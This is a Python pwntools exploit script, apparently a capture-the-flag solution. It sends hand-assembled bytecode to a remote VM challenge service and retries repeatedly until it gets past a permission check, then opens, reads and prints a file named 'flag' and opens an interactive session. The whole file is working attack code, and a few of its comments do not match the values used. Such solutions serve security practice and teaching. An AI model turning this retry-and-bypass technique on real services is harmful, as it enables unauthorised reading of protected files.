from pwn import *
def q(x):
  return struct.pack(">L",x)
HOST = "110.10.147.126"
PORT = 9080
REMOTE = 1
for i in range(0xffff):
  if(REMOTE):
    s = remote(HOST,PORT)
  else:
    s = remote('54.180.100.218',PORT)
  def op(code, func, r1, r2, value):
    c = 0
    c |= code << 0x1b
    c |= func << 0x18
    c |= r1 << 0x14
    c |= r2 << 0x10
    c |= value
    return q(c)
  try:
    #raw_input()
    c = op(0xf,0x5,0x7,0x0,0xde6e) # mov reg7, 0xdead
    c += op(0xf,0x5,0xa,0x0,0x1000) # mov sp, 0x4042
    c += op(0xd,0x1,0x7,0x0,0x0) # push reg7

    c += op(0xf,0x5,0x9,0x0,0x4040+2) # mov sp, 0x4042
    c += op(0xd,0x1,0x7,0x0,0x0) # push reg7

    c += op(0xf,0x5,0x8,0x8,0x1) # mov reg8, 0x1

    c += op(0xf,0x5,0x1,0x0,0x6c66) # mov reg1, 0x6c66
    c += op(0xf,0x5,0x2,0x0,0x6761) # mov reg2, 0x6761

    c += op(0xd,0x1,0x3,0x3,0xffff) # push reg3
    
    c += op(0xd,0x1,0x2,0x2,0xffff) # push reg2
    c += op(0xd,0x1,0x1,0x1,0xffff) # push reg1
    
    
    c += op(0xf,0x5,0x1,0x1,0x403a) # mov reg1, 0xaefe-2
    c += op(0x1e,0,0,0,0) # syscall open
    s.recvuntil("[>] Input ByteCode to Run")
    s.sendline(c.encode('hex'))
    r = s.recvuntil("[>] Input ByteCode to Run")
    print [r]
    if r.find("[x] No Permission OPEN") == -1:
      c = op(0xf,0x5,0x8,0x8,0x2) # mov reg8, 0x2
      c += op(0xf,0x5,0x1,0x1,0x5) # mov reg1, 0x5
      c += op(0xf,0x5,0x2,0x2,0x0) # mov reg2, 0x0
      c += op(0xf,0x5,0x3,0x3,0x100) # mov reg3, 0x100
      c += op(0x1e,0,0,0,0) # syscall read

      c += op(0xf,0x5,0x8,0x8,0x3) # mov reg8, 0x3
      c += op(0xf,0x5,0x1,0x1,0x1) # mov reg1, 0x1
      c += op(0xf,0x5,0x2,0x2,0x0) # mov reg2, 0x0
      c += op(0xf,0x5,0x3,0x3,0x100) # mov reg3, 0x100
      c += op(0x1e,0,0,0,0) # syscall write
      s.sendline(c.encode('hex'))
      s.interactive()
      break;
  except:

      s.close()
      continue
  s.close()

